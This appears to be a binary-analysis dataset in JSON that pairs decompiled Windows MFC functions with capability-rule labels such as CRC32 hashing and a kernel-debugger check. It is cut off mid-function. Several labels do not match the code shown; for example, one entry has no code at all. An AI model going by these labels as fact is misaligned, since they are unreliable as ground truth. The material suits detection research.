{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004159d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004159d0(int32_t param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack20;\n    uint uStack16;\n    int32_t *piStack12;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack4 = -1;\n    iStack8 = 0x483e38;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe0;\n    *in_FS_OFFSET = &piStack12;\n    fcn.00412590(&param_2, param_2, 0x48a3e2, uVar1);\n    iVar3 = *(param_1 + 0x3f0);\n    iStack4 = 0;\n    piVar2 = fcn.004111d0(&piStack20, &param_2);\n    if ((*piVar2 == 0) || (*piVar2 != param_1 + 0x3ec)) {\n        fcn.0045780d();\n    }\n    if (piVar2[1] != iVar3) {\n        iVar3 = fcn.00415710(&iStack4);\n        uVar1 = *(iVar3 + 0x18);\n        uStack16 = 0xffffffff;\n        piVar2 = iStack8 + -4;\n        LOCK();\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**(iStack8 + -0x10) + 4))(iStack8 + -0x10);\n        }\n        *in_FS_OFFSET = unaff_EBX;\n        return uVar1 & 1;\n    }\n    piStack12 = 0xffffffff;\n    piVar2 = iStack4 + -4;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**(iStack4 + -0x10) + 4))(iStack4 + -0x10);\n    }\n    *in_FS_OFFSET = piStack20;\n    return 1;\n}\n",
        "token_count": 555
    },
    "0041e1d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041e1d4(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.004225b8(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[8]);\n    param_1[0xf] = param_1[0xf] | 0x18;\n    iVar6 = fcn.00425377();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x0041e293:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.00425930();\n            if (iVar7 == 0) {\n                fcn.004247b8(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.004226fd(1);\n                (*pcVar3)(param_1[8]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xf] = param_1[0xf] & 0xffffffe7;\n                return param_1[0x11];\n            }\n            iVar7 = fcn.004257c0(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.004226fd(1);\n        (*pcVar3)(param_1[8]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[8]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x0041e274;\n    goto code_r0x0041e28f;\ncode_r0x0041e274:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[8], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x0041e28f:\n        bVar2 = false;\n    }\n    goto code_r0x0041e293;\n}\n",
        "token_count": 788
    },
    "00421944": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00421944(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042b7b9();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.00459330(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.0042b7b9();\n        var_24h = *(iVar1 + 8);\n        var_1ch = *0x4ad238;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            var_34h = 0xb;\n            var_10h = \"AfxWnd80s\";\n            iVar1 = fcn.0042165d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            var_10h = \"AfxOleControl80s\";\n            iVar1 = fcn.0042165d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            var_10h = \"AfxControlBar80s\";\n            var_18h = 0x10;\n            iVar1 = fcn.0042165d(&var_34h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            var_18h = 0;\n            iVar1 = fcn.00421903(&var_34h, \"AfxMDIFrame80s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            var_18h = 6;\n            iVar1 = fcn.00421903(&var_34h, \"AfxFrameOrView80s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0041edef(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0041edef(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0041edef(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0041edef(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0041edef(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0041edef(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0041edef(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0041edef(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0041edef(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0041edef(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0041edef(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0041edef(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0041edef(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0041edef(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 1780
    },
    "004229c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004229c8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (arg_18h != 0) {\n        arg_18h = *(arg_18h + 4);\n    }\n    uVar1 = (*_sym.imp.USER32.dll_ScrollWindowEx)\n                      (*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if ((*(in_ECX + 0x4c) != 0) && ((arg_20h & 1) != 0)) {\n        (**(**(in_ECX + 0x4c) + 0x5c))(arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 232
    },
    "00422f15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00422f15(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00422901();\n    puVar4 = &var_8h;\n    fcn.00422901(puVar4);\n    do {\n        iVar1 = var_4h;\n        if (var_4h == 0) {\n            puVar3 = &var_10h;\ncode_r0x00422f6a:\n            fcn.00422901(puVar3, puVar4);\n            return arg_8h;\n        }\n        uVar2 = fcn.00422843();\n        if ((uVar2 >> 0x11 & 1) != 0) {\ncode_r0x00422f67:\n            puVar3 = &var_8h;\n            goto code_r0x00422f6a;\n        }\n        if (var_10h != var_8h) {\n            fcn.0041901a();\n            goto code_r0x00422f67;\n        }\n        puVar4 = &var_4h;\n        var_ch = iVar1;\n        fcn.00422984();\n    } while( true );\n}\n",
        "token_count": 318
    },
    "00422f7b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00422f7b(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00422901();\n    fcn.00422ee4(&var_8h, 1);\n    while( true ) {\n        if (var_4h == 0) {\n            return arg_8h;\n        }\n        uVar1 = fcn.00422843();\n        if ((uVar1 >> 0x11 & 1) != 0) break;\n        fcn.00422951();\n        if (*(arg_8h + 4) != 0) {\n            fcn.00422951();\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 177
    },
    "00423091": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423091(uint param_1)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00422901(param_1);\n    bVar1 = false;\n    do {\n        if (((var_4h == 0) || (fcn.00422951(&var_4h),  iVar5 = var_4h,  var_4h == 0)) ||\n           (uVar3 = fcn.00422843(),  (uVar3 >> 0x11 & 1) != 0)) {\n            uVar4 = fcn.00422f15(&var_10h);\n            fcn.0042291d(uVar4);\n            if (var_4h == 0) {\n                return;\n            }\n            if (bVar1) {\n                return;\n            }\n            bVar1 = true;\n            iVar5 = var_4h;\n        }\n        cVar2 = fcn.0042285c(*(iVar5 + 8));\n        if (cVar2 == '\\0') {\n            fcn.0042291d(&var_8h);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 303
    },
    "0042310c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042310c(uint param_1)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00422901(param_1);\n    bVar1 = false;\n    do {\n        if ((var_4h == 0) || (uVar3 = fcn.00422843(),  (uVar3 >> 0x11 & 1) != 0)) {\n            uVar4 = fcn.00422f7b(&var_10h);\n            fcn.0042291d(uVar4);\n            if (var_4h == 0) {\n                return;\n            }\n            if (bVar1) {\n                return;\n            }\n            bVar1 = true;\n        }\n        else {\n            fcn.00422984(&var_4h);\n        }\n        if ((var_4h != 0) && (cVar2 = fcn.0042285c(*(var_4h + 8)),  cVar2 == '\\0')) {\n            fcn.0042291d(&var_8h);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 287
    },
    "00423601": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00423601(uint noname_0, int32_t noname_1, int32_t noname_2, uint noname_3, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    \n    if (noname_2 != 0) {\n        if (noname_1 == 0) {\n            fcn.0041901a();\n        }\n        if ((~*(var_8h + 0x18) & 1) == 0) {\n            do {\n                noname_2 = noname_2 + -1;\n                fcn.0043478d(var_8h, noname_1);\n                noname_1 = noname_1 + 4;\n            } while (noname_2 != 0);\n        }\n        else {\n            do {\n                noname_2 = noname_2 + -1;\n                fcn.0042359f();\n                fcn.00434740(var_8h, noname_1);\n                noname_1 = noname_1 + 4;\n            } while (noname_2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00423c17": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00423c17(uint param_1, uint8_t param_2)\n\n{\n    fcn.004010d0();\n    if ((param_2 & 1) != 0) {\n        fcn.004170df(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 69
    },
    "0042a1d2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a1d2(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t extraout_ECX;\n    uint32_t uVar1;\n    \n    if ((arg_10h != 0) && (arg_ch == 0)) {\n        arg_10h = fcn.0041901a();\n        arg_ch = extraout_ECX;\n    }\n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00429f7a();\n        }\n    }\n    else {\n        for (; arg_10h != 0; arg_10h = arg_10h - uVar1) {\n            uVar1 = 0x1fffffff;\n            if (arg_10h < 0x1fffffff) {\n                uVar1 = arg_10h;\n            }\n            fcn.00432d0d(arg_ch, uVar1 * 4);\n            arg_ch = arg_ch + uVar1 * 4;\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0042d05b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d05b(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    fcn.00459330(&var_20h, 0, 0x20);\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1011, 0, &var_20h);\n    if (((uVar1 & 1) != 0) && (arg_8h != NULL)) {\n        *arg_8h = var_20h;\n        arg_8h[1] = uStack32;\n        arg_8h[2] = uStack28;\n        arg_8h[3] = uStack24;\n    }\n    if (((uVar1 & 2) != 0) && (arg_ch != NULL)) {\n        *arg_ch = var_10h;\n        arg_ch[1] = uStack16;\n        arg_ch[2] = uStack12;\n        arg_ch[3] = uStack8;\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0042d350": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nfloat10 fcn.0042d350(double param_1)\n\n{\n    float10 fVar1;\n    \n    fVar1 = param_1;\n    if (fVar1 < 0) {\n        fVar1 = fcn.0045cc50(param_1);\n        fVar1 = fVar1 - (param_1 - fVar1);\n    }\n    return fVar1;\n}\n",
        "token_count": 87
    },
    "0042d406": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042d406(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    \n    fcn.00459330(&var_28h, 0, 0x20);\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1003, 0, &var_28h);\n    if ((arg_8h != NULL) && ((uVar1 & 1) != 0)) {\n        puVar2 = fcn.0042d20f(&var_28h, 0xffffffff);\n        *arg_8h = *puVar2;\n        arg_8h[1] = puVar2[1];\n    }\n    if ((arg_ch != NULL) && ((uVar1 & 2) != 0)) {\n        puVar2 = fcn.0042d20f(&var_18h, 0xffffffff);\n        *arg_ch = *puVar2;\n        arg_ch[1] = puVar2[1];\n    }\n    return uVar1;\n}\n",
        "token_count": 286
    },
    "0042d87f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042d87f(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    \n    fcn.00459330(&var_28h, 0, 0x20);\n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1011, 0, &var_28h);\n    if (((uVar1 & 1) != 0) && (arg_8h != NULL)) {\n        puVar2 = fcn.0042d20f(&var_28h, 0xffffffff);\n        *arg_8h = *puVar2;\n        arg_8h[1] = puVar2[1];\n    }\n    if (((uVar1 & 2) != 0) && (arg_ch != NULL)) {\n        puVar2 = fcn.0042d20f(&var_18h, 0xffffffff);\n        *arg_ch = *puVar2;\n        arg_ch[1] = puVar2[1];\n    }\n    return uVar1;\n}\n",
        "token_count": 287
    },
    "0042df86": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0042df86(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_10h;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.00459330(&var_30h, 0, 0x20);\n    var_4h = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1003, 0, &var_30h);\n    if (arg_8h != NULL) {\n        if ((var_4h & 1) == 0) {\n            arg_8h[2] = 2;\n        }\n        else {\n            var_8h = 0;\n            _var_10h = 0;\n            fcn.0042dc93(&var_30h);\n            *arg_8h = var_10h;\n            arg_8h[1] = uStack16;\n            arg_8h[2] = var_8h;\n        }\n    }\n    if (arg_ch != NULL) {\n        if ((var_4h & 2) == 0) {\n            arg_ch[2] = 2;\n        }\n        else {\n            puVar1 = fcn.0042de79(&var_20h);\n            *arg_ch = *puVar1;\n            arg_ch[1] = puVar1[1];\n            arg_ch[2] = puVar1[2];\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 384
    },
    "0042e0f2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0042e0f2(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_10h;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.00459330(&var_30h, 0, 0x20);\n    var_4h = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1011, 0, &var_30h);\n    if (((var_4h & 1) != 0) && (arg_8h != NULL)) {\n        var_8h = 0;\n        _var_10h = 0;\n        fcn.0042dc93(&var_30h);\n        *arg_8h = var_10h;\n        arg_8h[1] = uStack16;\n        arg_8h[2] = var_8h;\n    }\n    if (((var_4h & 2) != 0) && (arg_ch != NULL)) {\n        puVar1 = fcn.0042de79(&var_20h);\n        *arg_ch = *puVar1;\n        arg_ch[1] = puVar1[1];\n        arg_ch[2] = puVar1[2];\n    }\n    return var_4h;\n}\n",
        "token_count": 346
    },
    "0042eab6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.0042eab6(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint lpvBits;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.004320fb(8);\n    if (*0x4ad1bc == 0) {\n        iVar2 = 0;\n        do {\n            uVar1 = iVar2;\n            iVar2 = iVar2 + 1;\n            *(&stack0xffffffe6 + iVar2 * 2) = 0x5555 << (uVar1 & 1);\n        } while (iVar2 < 8);\n        iVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, &lpvBits);\n        if (iVar2 != 0) {\n            *0x4ad1bc = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar2);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n        }\n    }\n    if (*0x4ad1c0 == '\\0') {\n        iVar2 = fcn.004567cf(0x42e87c);\n        *0x4ad1c0 = '\\x01' - (iVar2 != 0);\n    }\n    fcn.00432168(8);\n    iVar2 = *0x4ad1bc;\n    fcn.0041a541();\n    fcn.004566a8(iVar2);\n    return;\n}\n",
        "token_count": 345
    },
    "00431157": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431157(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    iStack24 = param_1 + 0x1c;\n    iStack28 = 0x43116c;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar3 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar3 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar3) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar3);\n            if (iVar7 < iVar3) goto code_r0x0043123b;\n        }\n        iVar3 = iVar3 + 0x20;\n        iStack28 = *(param_1 + 0x10);\n        if (iStack28 == 0) {\n            iStack28 = 8;\n            iStack36 = 0x4311b7;\n            iStack32 = iVar3;\n            iStack28 = fcn.004161d0();\n            iStack32 = 2;\n            iStack36 = 0x4311c2;\n            iStack36 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            iStack32 = 0x4311cb;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack36 = 0x4311d4;\n            iStack32 = uVar4;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack36 = 0x2002;\n            iStack40 = 8;\n            iStack44 = iVar3;\n            iStack40 = fcn.004161d0();\n            iStack44 = uVar4;\n            iStack36 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack36 == 0) {\n            iStack36 = *(param_1 + 0x10);\n            if (iStack36 != 0) {\n                iStack40 = 0x4311fd;\n                iStack40 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                iStack44 = 0x431204;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            iStack40 = 0x43120e;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            iStack44 = 0x4a8560;\n            iStack40 = iVar3;\n            fcn.00456b8d(&stack0xffffffd4, 0x49eca0);\n            pcVar2 = swi(3);\n            iVar3 = (*pcVar2)();\n            return iVar3;\n        }\n        iStack40 = 0x43121a;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack28 = (iVar3 - *(param_1 + 4)) * 8;\n        iStack36 = iVar5 + *(param_1 + 4) * 8;\n        iStack32 = 0;\n        iStack40 = 0x431232;\n        fcn.00459330();\n        *(param_1 + 4) = iVar3;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x0043123b:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    iStack32 = 0x43125f;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 1013
    },
    "00432687": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00432687(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00435da3(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.00417b17(arg_8h, arg_ch, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 